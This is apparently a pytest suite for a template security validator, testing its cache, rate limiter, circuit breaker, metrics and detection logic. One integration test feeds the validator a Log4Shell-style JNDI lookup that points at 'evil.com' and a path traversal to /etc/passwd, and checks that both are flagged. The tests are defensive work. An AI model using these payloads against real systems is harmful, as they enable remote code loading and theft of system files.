"""
Comprehensive test suite for refactored Template Security Validator.

Includes unit tests, integration tests, property-based tests,
and chaos testing to validate the refactored architecture.
"""

import pytest
import hypothesis
from hypothesis import given, strategies as st
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Any

from threatsimgpt.security.config import SecurityValidatorConfig
from threatsimgpt.security.refactored_validator import RefactoredTemplateSecurityValidator
from threatsimgpt.security.sharded_cache import ShardedValidationCache
from threatsimgpt.security.enhanced_audit_logger import EnhancedAuditLogger
from threatsimgpt.security.rate_limiter import MultiTenantRateLimiter
from threatsimgpt.security.metrics import MetricsCollector
from threatsimgpt.security.circuit_breaker import CircuitBreaker, CircuitBreakerError


class TestSecurityValidatorConfig:
    """Test configuration management."""
    
    def test_from_env(self):
        """Test configuration from environment variables."""
        import os
        
        # Set environment variables
        os.environ['MAX_TEMPLATE_SIZE'] = '2000000'
        os.environ['STRICT_MODE'] = 'false'
        os.environ['CACHE_TTL_SECONDS'] = '600'
        
        config = SecurityValidatorConfig.from_env()
        
        assert config.max_template_size == 2000000
        assert config.strict_mode is False
        assert config.cache_ttl_seconds == 600
    
    def test_config_validation(self):
        """Test configuration validation."""
        # Valid config
        config = SecurityValidatorConfig()
        config.validate()  # Should not raise
        
        # Invalid config
        config.max_template_size = -1
        with pytest.raises(ValueError, match="max_template_size must be positive"):
            config.validate()
    
    def test_config_to_dict(self):
        """Test configuration serialization."""
        config = SecurityValidatorConfig()
        config_dict = config.to_dict()
        
        assert isinstance(config_dict, dict)
        assert 'max_template_size' in config_dict
        assert 'strict_mode' in config_dict


class TestShardedCache:
    """Test sharded cache implementation."""
    
    def test_cache_put_get(self):
        """Test basic cache operations."""
        config = SecurityValidatorConfig()
        cache = ShardedValidationCache(config)
        
        # Test put and get
        cache.put("key1", "value1")
        assert cache.get("key1") == "value1"
        assert cache.get("key2") is None
        
        # Test stats
        stats = cache.get_stats()
        assert stats['global_stats']['hits'] == 1
        assert stats['global_stats']['misses'] == 1
    
    def test_cache_expiration(self):
        """Test cache entry expiration."""
        config = SecurityValidatorConfig(cache_ttl_seconds=1)
        cache = ShardedValidationCache(config)
        
        cache.put("key1", "value1")
        assert cache.get("key1") == "value1"
        
        # Wait for expiration
        time.sleep(1.1)
        assert cache.get("key1") is None
    
    def test_cache_size_limit(self):
        """Test cache size limit enforcement."""
        config = SecurityValidatorConfig(cache_max_size=2)
        cache = ShardedValidationCache(config)
        
        cache.put("key1", "value1")
        cache.put("key2", "value2")
        cache.put("key3", "value3")  # Should evict oldest
        
        # Should have 2 entries
        stats = cache.get_stats()
        assert stats['aggregate']['total_size'] == 2
    
    def test_concurrent_access(self):
        """Test concurrent cache access."""
        config = SecurityValidatorConfig()
        cache = ShardedValidationCache(config)
        
        def worker(worker_id):
            for i in range(100):
                key = f"worker{worker_id}_key{i}"
                value = f"worker{worker_id}_value{i}"
                cache.put(key, value)
                retrieved = cache.get(key)
                assert retrieved == value
        
        # Run concurrent workers
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(worker, i) for i in range(10)]
            for future in as_completed(futures):
                future.result()  # Wait for completion
        
        # Verify cache integrity
        stats = cache.get_stats()
        assert stats['global_stats']['total_requests'] == 1000


class TestRateLimiter:
    """Test rate limiting implementation."""
    
    def test_basic_rate_limiting(self):
        """Test basic rate limiting functionality."""
        limiter = MultiTenantRateLimiter(requests_per_minute=5)
        
        # Should allow first 5 requests
        for i in range(5):
            assert limiter.is_allowed("tenant1") is True
        
        # 6th request should be blocked
        with pytest.raises(Exception):  # RateLimitExceeded
            limiter.is_allowed("tenant1")
    
    def test_rate_limit_reset(self):
        """Test rate limit reset over time."""
        limiter = MultiTenantRateLimiter(requests_per_minute=2)
        
        # Use up limit
        limiter.is_allowed("tenant1")
        limiter.is_allowed("tenant1")
        
        # Should be blocked
        with pytest.raises(Exception):
            limiter.is_allowed("tenant1")
        
        # Wait and try again (this would need time mocking in real test)
        # For now, just test the stats
        stats = limiter.get_stats("tenant1")
        assert 'utilization_percent' in stats
    
    def test_multi_tenant_isolation(self):
        """Test that rate limits are isolated per tenant."""
        limiter = MultiTenantRateLimiter(requests_per_minute=2)
        
        # Tenant 1 uses limit
        limiter.is_allowed("tenant1")
        limiter.is_allowed("tenant1")
        
        # Tenant 2 should still be allowed
        assert limiter.is_allowed("tenant2") is True


class TestCircuitBreaker:
    """Test circuit breaker implementation."""
    
    def test_circuit_breaker_states(self):
        """Test circuit breaker state transitions."""
        breaker = CircuitBreaker(failure_threshold=3, timeout=1)
        
        # Initially closed
        assert breaker.get_state().value == "CLOSED"
        
        # Simulate failures
        failing_func = lambda: 1/0
        
        for i in range(3):
            try:
                breaker.call(failing_func)
            except ZeroDivisionError:
                pass  # Expected
        
        # Should be open now
        assert breaker.get_state().value == "OPEN"
        
        # Should raise CircuitBreakerError
        with pytest.raises(CircuitBreakerError):
            breaker.call(lambda: "test")
        
        # Wait for timeout
        time.sleep(1.1)
        
        # Should be half-open now
        assert breaker.get_state().value == "HALF_OPEN"
        
        # Success should close it
        result = breaker.call(lambda: "success")
        assert result == "success"
        assert breaker.get_state().value == "CLOSED"


class TestMetricsCollector:
    """Test metrics collection."""
    
    def test_metrics_recording(self):
        """Test metrics recording and aggregation."""
        collector = MetricsCollector()
        
        # Record some validations
        collector.record_validation_start()
        collector.record_validation_success(
            duration_ms=100.0,
            cache_hit=False,
            findings_count=2,
            findings_by_severity={'critical': 1, 'high': 1}
        )
        
        metrics = collector.get_metrics()
        assert metrics.total_validations == 1
        assert metrics.successful_validations == 1
        assert metrics.cache_misses == 1
        assert metrics.total_findings == 2
        assert metrics.critical_findings == 1
        assert metrics.high_findings == 1
    
    def test_recent_metrics(self):
        """Test recent metrics calculation."""
        collector = MetricsCollector()
        
        # Record some data
        collector.record_validation_success(100.0, True, 0)
        collector.record_validation_success(200.0, False, 1)
        collector.record_validation_failure(50.0, 'rate_limit')
        
        recent = collector.get_recent_metrics(minutes=5)
        assert recent['total_requests'] == 3
        assert recent['success_rate'] == 2/3
        assert recent['avg_duration_ms'] == 350.0 / 3


class TestRefactoredValidator:
    """Test the refactored validator."""
    
    def test_validator_initialization(self):
        """Test validator initialization."""
        validator = RefactoredTemplateSecurityValidator()
        
        assert validator.config is not None
        assert validator.validation_engine is not None
        assert validator.cache is not None
        assert validator.audit_logger is not None
        assert validator.metrics is not None
    
    def test_basic_validation(self):
        """Test basic template validation."""
        validator = RefactoredTemplateSecurityValidator()
        
        template_data = {
            "name": "test_template",
            "description": "A safe test template",
            "steps": [
                {"name": "step1", "action": "test"}
            ]
        }
        
        result = validator.validate_template(template_data)
        
        assert result is not None
        assert isinstance(result.findings, list)
        assert result.validation_id is not None
        assert result.template_hash is not None
    
    def test_cache_functionality(self):
        """Test caching functionality."""
        config = SecurityValidatorConfig(enable_caching=True)
        validator = RefactoredTemplateSecurityValidator(config)
        
        template_data = {
            "name": "cached_template",
            "description": "Test caching"
        }
        
        # First validation - cache miss
        result1 = validator.validate_template(template_data)
        hash1 = result1.template_hash
        
        # Second validation - cache hit
        result2 = validator.validate_template(template_data)
        hash2 = result2.template_hash
        
        assert hash1 == hash2
        assert result1.validation_id != result2.validation_id  # Different IDs
    
    def test_metrics_collection(self):
        """Test metrics are collected during validation."""
        validator = RefactoredTemplateSecurityValidator()
        
        template_data = {"name": "metrics_test"}
        validator.validate_template(template_data)
        
        metrics = validator.get_metrics()
        assert 'validation_metrics' in metrics
        assert metrics['validation_metrics']['counters']['total_validations'] >= 1


class TestPropertyBased:
    """Property-based tests using Hypothesis."""
    
    @given(st.text(min_size=1, max_size=100))
    def test_template_validation_properties(self, template_content):
        """Test validation invariants."""
        validator = RefactoredTemplateSecurityValidator()
        
        # Create basic template structure
        template_data = {
            "name": template_content[:50] if template_content else "test",
            "description": template_content
        }
        
        result = validator.validate_template(template_data)
        
        # Invariants that should always hold
        assert result is not None
        assert result.validation_id is not None
        assert result.template_hash is not None
        assert len(result.template_hash) == 32  # Default hash length
        assert isinstance(result.findings, list)
        assert result.validated_at is not None


class TestChaosEngineering:
    """Chaos engineering tests."""
    
    def test_validation_under_load(self):
        """Test validator under concurrent load."""
        validator = RefactoredTemplateSecurityValidator()
        
        def validate_worker(worker_id):
            template_data = {
                "name": f"load_test_{worker_id}",
                "description": f"Test template {worker_id}"
            }
            
            try:
                result = validator.validate_template(template_data)
                return {'worker_id': worker_id, 'success': True, 'result': result}
            except Exception as e:
                return {'worker_id': worker_id, 'success': False, 'error': str(e)}
        
        # Run concurrent validations
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(validate_worker, i) for i in range(50)]
            results = [future.result() for future in as_completed(futures)]
        
        # Analyze results
        successful = sum(1 for r in results if r['success'])
        failed = len(results) - successful
        
        assert successful > 0, "No validations succeeded"
        assert failed < len(results) * 0.1, f"Too many failures: {failed}/{len(results)}"
        
        # Check system health
        health = validator.get_health()
        assert health['status'] in ['healthy', 'degraded'], f"System unhealthy: {health}"
    
    def test_cache_corruption_resilience(self):
        """Test cache corruption resilience."""
        config = SecurityValidatorConfig(enable_caching=True)
        validator = RefactoredTemplateSecurityValidator(config)
        
        template_data = {"name": "corruption_test"}
        
        # Normal validation
        result1 = validator.validate_template(template_data)
        
        # Manually corrupt cache (simulate corruption)
        if validator.cache:
            validator.cache.put("corrupted_key", {"corrupted": True})
        
        # Should still work (fallback to validation)
        result2 = validator.validate_template(template_data)
        
        assert result2 is not None
        assert result2.template_hash == result1.template_hash


class TestIntegration:
    """Integration tests for the complete system."""
    
    def test_end_to_end_validation(self):
        """Test complete validation pipeline."""
        config = SecurityValidatorConfig(
            enable_caching=True,
            rate_limit_enabled=True,
            rate_limit_requests_per_minute=100
        )
        validator = RefactoredTemplateSecurityValidator(
            config=config,
            tenant_id="integration_test"
        )
        
        # Test with malicious template
        malicious_template = {
            "name": "malicious_test",
            "description": "Template with injection",
            "steps": [
                {
                    "name": "inject",
                    "action": "${jndi:ldap://evil.com/a}",
                    "path": "../../../etc/passwd"
                }
            ]
        }
        
        result = validator.validate_template(malicious_template)
        
        # Should detect issues
        assert result.is_secure is False
        assert len(result.findings) > 0
        
        # Check that critical findings are logged
        critical_findings = [
            f for f in result.findings 
            if f.severity.value == 'critical'
        ]
        assert len(critical_findings) > 0
        
        # Verify metrics
        metrics = validator.get_metrics()
        assert metrics['validation_metrics']['counters']['total_validations'] >= 1
        assert metrics['validation_metrics']['findings']['critical_findings'] >= 1
        
        # Verify health
        health = validator.get_health()
        assert health['status'] == 'healthy'
    
    def test_configuration_integration(self):
        """Test configuration changes affect behavior."""
        # Test with strict mode
        config_strict = SecurityValidatorConfig(strict_mode=True)
        validator_strict = RefactoredTemplateSecurityValidator(config_strict)
        
        # Test with non-strict mode
        config_lenient = SecurityValidatorConfig(strict_mode=False)
        validator_lenient = RefactoredTemplateSecurityValidator(config_lenient)
        
        template_data = {
            "name": "strict_test",
            "description": "Test with medium severity finding"
        }
        
        result_strict = validator_strict.validate_template(template_data)
        result_lenient = validator_lenient.validate_template(template_data)
        
        # Strict mode might block more than lenient mode
        # (This depends on the actual template content)
        assert result_strict is not None
        assert result_lenient is not None


if __name__ == "__main__":
    # Run basic tests
    print("Running refactored validator tests...")
    
    # Test configuration
    config_test = TestSecurityValidatorConfig()
    config_test.test_from_env()
    print("✓ Configuration tests passed")
    
    # Test cache
    cache_test = TestShardedCache()
    cache_test.test_cache_put_get()
    cache_test.test_concurrent_access()
    print("✓ Cache tests passed")
    
    # Test rate limiter
    rate_test = TestRateLimiter()
    rate_test.test_basic_rate_limiting()
    rate_test.test_multi_tenant_isolation()
    print("✓ Rate limiter tests passed")
    
    # Test circuit breaker
    cb_test = TestCircuitBreaker()
    cb_test.test_circuit_breaker_states()
    print("✓ Circuit breaker tests passed")
    
    # Test metrics
    metrics_test = TestMetricsCollector()
    metrics_test.test_metrics_recording()
    print("✓ Metrics tests passed")
    
    # Test validator
    validator_test = TestRefactoredValidator()
    validator_test.test_validator_initialization()
    validator_test.test_basic_validation()
    validator_test.test_cache_functionality()
    print("✓ Validator tests passed")
    
    # Test integration
    integration_test = TestIntegration()
    integration_test.test_end_to_end_validation()
    print("✓ Integration tests passed")
    
    print("\n🎉 All tests passed! Refactored validator is working correctly.")
